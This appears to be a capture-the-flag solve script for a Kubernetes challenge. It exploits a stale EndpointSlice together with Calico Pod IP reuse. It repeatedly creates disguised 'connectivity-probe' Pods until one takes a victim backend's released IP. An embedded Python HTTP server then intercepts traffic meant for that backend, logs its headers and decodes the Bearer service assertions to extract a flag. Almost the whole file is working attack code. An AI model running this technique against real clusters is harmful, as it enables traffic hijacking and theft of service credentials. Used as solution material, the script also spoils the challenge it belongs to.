#!/bin/bash
###############################################################################
# Ghost in the Chain — Solve Script
#
# Vulnerability: stale service discovery (stale EndpointSlice) plus Pod IP reuse.
#   profile-query is a selectorless Service whose backend EndpointSlice is
#   manually maintained by the endpoint-catalog-reconciler controller. After
#   the backend Pod is recycled, the controller intentionally leaves the
#   EndpointSlice stale for a short lag window, so it still advertises the old
#   IP while Calico has already released it. An attacker who creates a Pod that
#   receives that old IP inherits the trusted backend network identity; kube-proxy
#   DNATs the profile-cache-refresh request to the attacker Pod, exposing the
#   service assertion and the embedded flag.

# Usage: run outside the cluster with the player's kubeconfig. No in-cluster
# Pod and no exec permission are required.
#   KUBECONFIG=runtime-operator.kubeconfig bash solve.sh
###############################################################################
set -uo pipefail

PLAYER_NS="${PLAYER_NAMESPACE:-tenant-runtime}"
VICTIM_NS="${VICTIM_NAMESPACE:-customer-platform}"
SVC="${SERVICE_NAME:-profile-query}"
BACKEND_LABEL="app.kubernetes.io/name=customer-profile-api"
MAX_PODS="${MAX_PODS:-6}"            # Honeypots per wave; tenant-runtime quota is 10, so 6 leaves room.
WAVE_SLEEP="${WAVE_SLEEP:-3}"        # Wait after each wave for Pod IP assignment.
OVERALL_TIMEOUT="${OVERALL_TIMEOUT:-360}"
TRAP_IMAGE="python:3.11-alpine"
PREFIX="connectivity-probe"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
info(){ echo -e "${GREEN}[+]${NC} $*"; }
warn(){ echo -e "${YELLOW}[!]${NC} $*"; }
err(){  echo -e "${RED}[-]${NC} $*"; }
step(){ echo -e "${CYAN}[*]${NC} $*"; }
ok(){   echo -e "${BOLD}${GREEN}[FLAG]${NC} $*"; }

cleanup(){ kubectl delete pods -n "$PLAYER_NS" -l app.kubernetes.io/name=connectivity-probe --grace-period=0 --force >/dev/null 2>&1 || true; }
trap cleanup EXIT INT TERM

# Backend IP currently advertised by the EndpointSlice; this is the selectorless Service's real forwarding target.
adv_ip(){ kubectl get endpointslices -n "$VICTIM_NS" -l kubernetes.io/service-name="$SVC" \
            -o jsonpath='{.items[0].endpoints[0].addresses[0]}' 2>/dev/null; }
# Current Running customer-profile-api backend Pod IP.
running_pod_ip(){ kubectl get pods -n "$VICTIM_NS" -l "$BACKEND_LABEL" --field-selector status.phase=Running \
            -o jsonpath='{.items[0].status.podIP}' 2>/dev/null; }
# Search for the expected flag format.
scan_flag(){ kubectl logs -n "$PLAYER_NS" -l app.kubernetes.io/name=connectivity-probe --tail=120 2>/dev/null \
            | grep -oE 'sk-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1; }

create_honeypot(){
  kubectl apply -n "$PLAYER_NS" -f - >/dev/null 2>&1 <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: $1
  namespace: $PLAYER_NS
  labels:
    app.kubernetes.io/name: connectivity-probe
    app.kubernetes.io/component: diagnostics
spec:
  serviceAccountName: runtime-operator
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 0
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: trap
      image: ${TRAP_IMAGE}
      imagePullPolicy: Never
      workingDir: /
      command: ["python3","-c"]
      args:
        - |
          from http.server import HTTPServer, BaseHTTPRequestHandler
          import base64, json
          class H(BaseHTTPRequestHandler):
              def _t(self, m):
                  print("="*50, flush=True); print(f"[CAPTURED] {m} {self.path}", flush=True)
                  for k,v in self.headers.items(): print(f"  {k}: {v}", flush=True)
                  auth = self.headers.get("Authorization", "")
                  token = auth.removeprefix("Bearer ").strip()
                  parts = token.split(".")
                  if len(parts) == 4 and parts[:2] == ["svc", "v1"]:
                      try:
                          raw = parts[2] + "=" * (-len(parts[2]) % 4)
                          payload = json.loads(base64.urlsafe_b64decode(raw))
                          proof = payload.get("service_proof", "")
                          if proof: print(f"[SERVICE_PROOF] {proof}", flush=True)
                      except Exception as exc:
                          print(f"[ASSERTION_DECODE_ERROR] {exc}", flush=True)
                  self.send_response(200); self.end_headers(); self.wfile.write(b'{"ok":1}')
              def do_GET(self): self._t("GET")
              def do_POST(self): self._t("POST")
              def log_message(self,*a): pass
          print("[trap] listening :8080", flush=True)
          HTTPServer(('0.0.0.0',8080), H).serve_forever()
      ports: [{containerPort: 8080}]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
EOF
}

main(){
  echo ""
  echo "╔══════════════════════════════════════════════════════╗"
  echo "║   Ghost in the Chain — stale EndpointSlice exploit    ║"
  echo "╚══════════════════════════════════════════════════════╝"

  kubectl get pods -n "$PLAYER_NS" >/dev/null 2>&1 || { err "kubectl is unavailable or cannot access ${PLAYER_NS}"; exit 1; }
  kubectl get pods -n "$VICTIM_NS" >/dev/null 2>&1 || { err "cannot observe ${VICTIM_NS}"; exit 1; }
  SVC_IP=$(kubectl get svc "$SVC" -n "$VICTIM_NS" -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
  [ -z "$SVC_IP" ] && { err "Service ${SVC} not found"; exit 1; }
  info "Service ${SVC} ClusterIP: ${SVC_IP} (selectorless)"
  step "Recon: compare the EndpointSlice-advertised backend with the actual Running backend"
  info "  EndpointSlice advertises: $(adv_ip)"
  info "  Running customer-profile-api Pod  : $(running_pod_ip)"
  warn "Suggested watches: kubectl get endpointslices -n ${VICTIM_NS} -w  /  kubectl get pods -n ${VICTIM_NS} -o wide -w"

  local start now idx=0
  start=$(date +%s)
  step "Waiting for a stale window, where the EndpointSlice IP has no matching Running backend..."
  while now=$(date +%s); [ $((now-start)) -lt "$OVERALL_TIMEOUT" ]; do
    ADV=$(adv_ip); POD=$(running_pod_ip)
    if [ -z "$ADV" ] || [ "$ADV" = "$POD" ]; then sleep 2; continue; fi

    TARGET="$ADV"
    echo ""
    info "Stale window! EndpointSlice still advertises ${TARGET}, but the current Running backend is ${POD:-<none>}"
    info "The old IP may still be in CNI reclamation; starting multi-wave attempts to acquire ${TARGET} ..."

    # Create multiple Pod waves inside the stale window; Calico may only reuse the IP after its release delay.
    while [ "$(adv_ip)" = "$TARGET" ]; do
      now=$(date +%s); [ $((now-start)) -lt "$OVERALL_TIMEOUT" ] || break
      names=""
      for i in $(seq 1 "$MAX_PODS"); do idx=$((idx+1)); create_honeypot "${PREFIX}-${idx}"; names="$names ${PREFIX}-${idx}"; done
      sleep "$WAVE_SLEEP"
      HIT=""
      for p in $names; do
        ip=$(kubectl get pod "$p" -n "$PLAYER_NS" -o jsonpath='{.status.podIP}' 2>/dev/null)
        if [ "$ip" = "$TARGET" ]; then HIT="$p"; ok "Honeypot Pod ${p} acquired target IP ${TARGET}!"; else [ -n "$ip" ] && echo "    ${p} -> ${ip}"; fi
      done
      # Do not wait for profile-cache-refresh after a miss; release this wave and continue rotating IPAM allocations.
      if [ -z "$HIT" ]; then
        kubectl delete pods -n "$PLAYER_NS" -l app.kubernetes.io/name=connectivity-probe --grace-period=0 --force >/dev/null 2>&1
        continue
      fi

      # After a hit, wait for the next profile-cache-refresh request (about every 10s) and scan for the flag.
      for _ in 1 2 3 4 5; do
        FLAG=$(scan_flag)
        if [ -n "$FLAG" ]; then
          echo ""; ok "$FLAG"; echo ""
          info "Captured request headers:"
          kubectl logs -n "$PLAYER_NS" -l app.kubernetes.io/name=connectivity-probe 2>/dev/null | grep -E 'CAPTURED|Authorization|SERVICE_PROOF|X-Request|X-Tenant|X-Service' | head -14
          exit 0
        fi
        sleep 2
      done
    done
    warn "The stale window closed because the EndpointSlice updated to the new backend; waiting for the next recycle..."
    cleanup
  done

  err "No flag captured within ${OVERALL_TIMEOUT}s."
  warn "The backend Pod is rotated periodically by the endpoint catalog controller; this identity cannot actively delete Pods in customer-platform."
  exit 1
}
main "$@"
